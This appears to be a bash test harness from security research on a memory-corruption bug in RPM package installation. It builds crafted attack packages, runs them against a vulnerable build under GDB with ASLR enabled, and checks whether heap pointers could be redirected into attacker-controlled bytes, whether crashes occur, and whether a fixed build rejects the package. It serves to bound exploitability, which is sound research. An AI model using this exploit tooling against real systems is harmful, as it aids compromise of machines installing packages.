#!/usr/bin/env bash
# Bounded refinement of the ASLR ceiling: live liblua objects DO lie in the
# controlled copy window, but no pointer at a safe write boundary redirects
# into controlled bytes; larger writes abort in glibc before the GC walk.
# GDB only observes; ASLR is enabled in every GDB run. No forced call.
set -u
cd "$(dirname "$0")"
root=$(cd .. && pwd)
config=${RPM_CONFIGDIR_VULN:-$root/install-vuln/lib/rpm}
fixed_config=${RPM_CONFIGDIR_FIXED:-$root/build-fixed-asan}
[ -f "$config/rpmrc" ] || config=$root/build-vuln-asan
vuln_plain=$root/build-vuln-plain/tools/rpm
fixed_asan=$root/build-fixed-asan/tools/rpm
for bin in "$vuln_plain" "$fixed_asan"; do
    [ -x "$bin" ] || { echo "MISSING $bin"; exit 1; }
done

work=$PWD/aslr-window
mkdir -p "$work/db"
targets=(/tmp/README /tmp/linkme /tmp/mydir /tmp/myscript.sh)
for p in "${targets[@]}"; do
    if [ -e "$p" ]; then
        echo "REFUSE: $p already exists; not overwriting an unrelated file"
        exit 1
    fi
done
cleanup() {
    rm -f /tmp/README /tmp/linkme /tmp/myscript.sh
    rmdir /tmp/mydir 2>/dev/null || true
}
trap cleanup EXIT
fresh() { cleanup; rm -rf "$work/db"; mkdir -p "$work/db"; }

# 289 bytes is below the glibc metadata boundary; 1377 is above it.
for len in 289 1377; do
    RPM2SHELL_PAYLOAD_LEN=$len python3 make-attack.py safe.rpm \
        "$work/attack-$len.rpm" > "$work/make-$len.log" || exit 1
    python3 - "$len" <<'PY' || exit 1
from pathlib import Path
import sys
length = sys.argv[1]
p = Path(f"aslr-window/attack-{length}.rpm")
blob = p.read_bytes()
assert blob.count(b"/opt/") == 5
p.with_name(f"attack-{length}-reloc.rpm").write_bytes(
    blob.replace(b"/opt/", b"/tmp/"))
PY
done

pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass + 1)); }
bad() { echo "FAIL $1"; fail=$((fail + 1)); }

# Window survey: three ASLR-on layouts. GDB observes both the pre-copy
# window and the liblua GC list walk (mov (%r14),%r14; movzbl 0x9(%r14)).
for n in 1 2 3; do
    fresh
    gdb -q -batch \
        -ex 'set disable-randomization off' \
        -ex "set environment RPM_CONFIGDIR $config" \
        -ex "directory $root/src/rpm/lib" \
        -x aslr-window/probe.gdb --args "$vuln_plain" \
        --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
        --nosignature --nofiledigest --ignoresize \
        "$PWD/install/attack-reloc.rpm" > "$work/probe-$n.log" 2>&1
    if grep -q 'WINDOW_REPORT_DONE=1' "$work/probe-$n.log" &&
       grep -qE 'WINDOW_VISIT_OFFSETS=[5-9]|WINDOW_VISIT_OFFSETS=[1-9][0-9]' "$work/probe-$n.log" &&
       grep -q 'Program received signal SIGSEGV' "$work/probe-$n.log"; then
        ok "live GC objects in copy window, ASLR on (run $n)"
    else
        bad "window survey run $n: $work/probe-$n.log"
    fi
done

# No candidate at a safe (<=289-byte) write boundary points back into the
# controlled window with a 256-byte block that a low-byte write could reach.
if python3 - <<'PY'
from pathlib import Path
safe = 0x121
bad = []
for n in (1, 2, 3):
    text = Path(f"aslr-window/probe-{n}.log").read_text()
    base = next((int(l.split("=")[1], 16) for l in text.splitlines()
                 if l.startswith("WINDOW_BUF=")), 0)
    for l in text.splitlines():
        parts = l.split()
        if len(parts) != 4 or parts[0] != "CAND" or parts[3] != "canonical=1":
            continue
        off = int(parts[1].split("=")[1], 16)
        value = int(parts[2].split("=")[1], 16)
        if off > safe or value <= base:
            continue
        delta = value - base
        if delta < off and (delta & ~0xff) + 0x10 <= off:
            bad.append((n, hex(off), hex(delta)))
print("SAFE_REDIRECT_CANDIDATES=%d" % len(bad))
for item in bad:
    print("CANDIDATE", *item)
raise SystemExit(1 if bad else 0)
PY
then
    ok "no low-byte redirect into controlled bytes at a safe length"
else
    bad "safe-length redirect candidate found"
fi

# A 289-byte write still reaches the liblua teardown fault.
for n in 1 2; do
    fresh
    RPM_CONFIGDIR="$config" "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$work/attack-289-reloc.rpm" \
        > "$work/len289-$n.log" 2>&1
    rc=$?
    if [ "$rc" -eq 139 ]; then
        ok "289-byte write reaches liblua fault (run $n)"
    else
        bad "289-byte write rc=$rc run $n"
    fi
done

# A 1377-byte write corrupts malloc metadata first; no GC walk is reached.
for n in 1 2; do
    fresh
    RPM_CONFIGDIR="$config" "$vuln_plain" --dbpath "$work/db" -i \
        --nodeps --noscripts --nodigest --nosignature --nofiledigest \
        --ignoresize "$work/attack-1377-reloc.rpm" \
        > "$work/len1377-$n.log" 2>&1
    rc=$?
    if [ "$rc" -eq 134 ] && grep -q 'double free or corruption' "$work/len1377-$n.log"; then
        ok "1377-byte write aborts in glibc before GC walk (run $n)"
    else
        bad "1377-byte write rc=$rc run $n"
    fi
done

fresh
RPM_CONFIGDIR="$fixed_config" ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
    "$fixed_asan" --dbpath "$work/db" -i --nodeps --noscripts --nodigest \
    --nosignature --nofiledigest --ignoresize "$work/attack-1377-reloc.rpm" \
    > "$work/fixed-len1377.log" 2>&1
rc=$?
if [ "$rc" -eq 1 ] && ! grep -q AddressSanitizer "$work/fixed-len1377.log"; then
    ok "fixed build rejects the 1377-byte package"
else
    bad "fixed 1377-byte rc=$rc"
fi

echo "ASLR_WINDOW_PASS=$pass ASLR_WINDOW_FAIL=$fail"
[ "$fail" -eq 0 ]
